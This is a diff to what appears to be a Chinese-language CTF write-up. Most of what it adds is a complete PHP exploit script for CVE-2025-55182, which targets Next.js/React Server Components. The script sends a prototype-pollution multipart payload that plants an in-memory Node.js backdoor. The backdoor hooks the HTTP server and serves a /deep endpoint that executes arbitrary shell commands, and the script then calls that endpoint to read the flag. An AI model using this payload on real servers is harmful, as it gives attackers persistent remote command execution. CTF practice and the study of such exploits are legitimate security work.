@@ -263,6 +263,56 @@ if(isset($_POST["submit"])) {
 
 ![img](https://my.feishu.cn/space/api/box/stream/download/asynccode/?code=OWYyMzgyYmZjNDIyYjIwOTIxYmMyNWFlZGZkYWVlOGJfY0VyVzZROGtOZ3hXWWwyejhHNUhybFFwQzBSM0dhWU5fVG9rZW46TVJ6T2JEWHZsbzJqU0d4M1Z4d2NwZ3FJblJkXzE3NzIyOTk3MzA6MTc3MjMwMzMzMF9WNA)
 
+利用`CVE-2025-55182`,写PHP代理脚本利用原型链污染实现内存马注入
+
+```PHP
+<?php
+$target = "http://10.0.0.2:3000/";
+$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : "cat /flag";
+// 内存马核心 Payload（劫持 http.Server.prototype.emit，将后门挂载到 /deep）
+$payload_json = '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"(async()=>{const http=await import(\'node:http\');const url=await import(\'node:url\');const cp=await import(\'node:child_process\');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event===\'request\'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname===\'/deep\'){const cmd=parsedUrl.query.cmd||\'whoami\';cp.exec(cmd,(err,stdout,stderr)=>{res.writeHead(200,{\'Content-Type\':\'application/json\'});res.end(JSON.stringify({success:!err,stdout,stderr,error:err?err.message:null}));});return true;}}return originalEmit.apply(this,arguments);};})();","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}';
+
+$boundary = "----WebKitFormBoundaryExploit";
+$data = "--{$boundary}\r\n" .
+        "Content-Disposition: form-data; name=\"0\"\r\n\r\n" .
+        "{$payload_json}\r\n" .
+        "--{$boundary}\r\n" .
+        "Content-Disposition: form-data; name=\"1\"\r\n\r\n" .
+        "\"$@0\"\r\n" .
+        "--{$boundary}\r\n" .
+        "Content-Disposition: form-data; name=\"2\"\r\n\r\n" .
+        "[]\r\n" .
+        "--{$boundary}--\r\n";
+
+// 1. 发送注入请求 (挂载内存马)
+$ch1 = curl_init();
+curl_setopt($ch1, CURLOPT_URL, $target);
+curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch1, CURLOPT_POST, true);
+curl_setopt($ch1, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch1, CURLOPT_TIMEOUT, 2); 
+curl_setopt($ch1, CURLOPT_HTTPHEADER, array(
+    "Next-Action: x",
+    "Content-Type: multipart/form-data; boundary={$boundary}",
+    "Accept: text/x-component"
+));
+@curl_exec($ch1); 
+curl_close($ch1);
+
+sleep(1);
+
+// 2. 触发后门接口获取回显
+$shell_url = $target . "deep?cmd=" . urlencode($cmd);
+$ch2 = curl_init();
+curl_setopt($ch2, CURLOPT_URL, $shell_url);
+curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch2, CURLOPT_TIMEOUT, 10);
+$result = curl_exec($ch2);
+curl_close($ch2);
+
+echo $result;
+?>
+```
 ## 魔理沙的魔法目录
 
 在开发者工具的网络流中发现`record`的api,抓包修改`time`字段
@@ -857,4 +907,5 @@ request.interceptors.response.use(response => {
 export default request;
 
 ```
+
 
